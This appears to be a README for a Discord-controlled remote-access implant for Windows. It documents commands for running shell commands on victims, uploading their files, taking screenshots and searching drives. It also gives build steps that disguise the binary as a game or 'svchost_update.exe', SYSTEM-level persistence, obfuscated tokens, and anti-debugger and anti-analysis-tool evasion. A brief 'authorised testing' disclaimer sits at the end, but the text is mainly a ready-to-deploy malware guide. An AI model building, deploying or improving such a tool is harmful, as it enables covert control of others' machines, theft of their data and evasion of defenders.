# opss-terconnect

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

Discord bot C2 — Nuitka-compiled Windows binary for remote command execution, file download, screenshot capture, and file search from a Discord control channel. Persistent via scheduled task + registry run key. No Discord gateway — uses only Python stdlib (`urllib`) for HTTP polling.

## Screenshots

![Connected](images/connected.png)
![Ping](images/ping.png)
![Exec](images/exec.png)
![Download](images/download.png)

## Overview

One binary per target machine. Each target runs its own Discord bot (HTTP API client) with its own token. The binary polls the Discord REST API for commands in a control channel; the matching target executes and sends results back via HTTP. On first run, the binary installs itself as a scheduled task (runs at user logon) and adds a registry run key — so it survives reboots.



## Quickstart

```bash
python token_gen.py "MT...bot-token..." "channel_id" "admin_id"
# → paste the output into VALORANT.py

pip install -r requirements.txt
python -m nuitka --onefile --windows-console-mode=disable \
    --windows-icon-from-ico=valorant.ico \
    --lto \
    --python-flag=no_site \
    --python-flag=no_user_site \
    --assume-yes-for-downloads \
    VALORANT.py
```

Then see [Build](#build) for the full hardening flags and [Deploy](#deploy) for deployment steps.

## Build

**One build per target. One token per target. Do not share binaries.**

```bash
# 1. Generate XOR-obfuscated config (on build machine, with real token)
python token_gen.py "MT...bot-token..." "channel_id" "admin_id"
# → paste the output into VALORANT.py, replacing the placeholder lists

# 2. Compile
pip install -r requirements.txt
python -m nuitka --onefile --windows-console-mode=disable \
    --windows-icon-from-ico=valorant.ico \
    --lto \
    --python-flag=no_site \
    --python-flag=no_user_site \
    --assume-yes-for-downloads \
    VALORANT.py

# 3. (Optional) Strip debug symbols
#    Linux:  strip VALORANT.exe
#    Windows: editbin /STS or similar

# 4. Rename to a generic name (e.g. svchost_update.exe)
#    Process name in Task Manager = filename. Pick something boring.
```

The token, channel ID, and admin ID are XOR-obfuscated in source — never in plaintext. The compiled binary does not reveal them via `strings` or static analysis. See [Security](#security) for details.

## Deploy

Copy the `.exe` to the target machine and run it. The binary handles everything automatically:

- **First run:** runs anti-analysis defenses, installs itself as persistent (scheduled task + registry run key), announces in the control channel, starts polling.
- **On reboot:** the scheduled task restarts the binary automatically — no manual step needed.
- **Stop:** end the process in Task Manager. Persistence remains; the binary restarts at next logon.

The binary is the persistence. Copy it, run it, and it stays.

## Commands

| Command | What it does |
|---------|-------------|
| `!exec <name> <cmd>` | Run `<cmd>` on the target whose hostname matches `<name>` (uppercase). Result posted back. |
| `!download <name> <path>` | Upload file at `<path>` from target `<name>` to the control channel (max 25 MB). |
| `!pingall` | All targets respond with an alive message. |
| `!screenshot` | Capture primary screen, upload as BMP file to the control channel. |
| `!filesearch <pattern> [path]` | Search for files matching `<pattern>` (e.g. `*.docx`) under `[path]` (default: C:\). Up to 100 results. |
| `!uninstall` | Remove persistence (scheduled task + registry run key). Binary stays on disk. |
| `!selfdestruct` | Remove persistence + schedule binary deletion on next reboot. Exits immediately. |

## Security

### Built-in

- **XOR-obfuscated credentials** — token, channel ID, admin ID as XOR byte arrays. Token is split into multiple arrays and the decode key is derived at runtime from separate constants. No plaintext in source or binary. Defends against `strings` and static disassembly.
- **Anti-debug** — `IsDebuggerPresent` + `CheckRemoteDebuggerPresent` checked at startup AND before each token decode. Silent exit if attached.
- **Anti-tool scan** — process list checked for ProcmDump, Process Hacker, x64dbg, Cheat Engine, WinDbg, IDA, dnSpy, and others. Silent exit if found.
- **Per-request token decode** — token decoded into a short-lived buffer for each HTTP call, converted to string for the auth header, then wiped (3-pass). Plaintext token lifetime is bounded to the duration of each HTTP call, not the life of the process.
- **CreateProcess via ctypes** — commands run with `CREATE_NO_WINDOW` flag, no visible console window.
- **Polling jitter** — 4–6 second random sleep between polls instead of fixed 5-second interval, to avoid a machine-identifiable pattern.
- **Persistence** — scheduled task (runs at user logon as SYSTEM) + HKCU Run key. Both use a generic task name chosen at build time. Survives reboots.

## Cleanup

Easy path — use the Discord commands:

- **`!uninstall`** — removes persistence (scheduled task + registry). Binary stays on disk. Copy and run again to re-persist.
- **`!selfdestruct`** — removes persistence and schedules the binary for deletion on next reboot. Exits immediately.

Or just delete the `.exe` file. If persistence was installed, also remove it manually: delete the `WindowsSecurityCheck` scheduled task in Task Scheduler.

## Repository structure

```
opss-terconnect/
├── VALORANT.py          # Main bot (XOR config, anti-analysis, HTTP polling, persistence, commands)
├── defenses.py          # Anti-debug / anti-dump helpers
├── persistence.py       # Persistence, screenshot, file search, self-destruct
├── token_gen.py         # CLI tool: generate XOR-obfuscated config
├── requirements.txt     # nuitka (build tool only)
├── .gitignore
├── README.md
├── images/
│   ├── connected.png
│   ├── ping.png
│   ├── exec.png
│   ├── download.png
│   └── pwned.png
└── valorant.ico
```

## License

MIT — see [LICENSE](LICENSE).

---

## ⚠️ Authorised testing and learning only

This tool is for authorised security testing and learning. Do not use against systems you do not have permission to test.


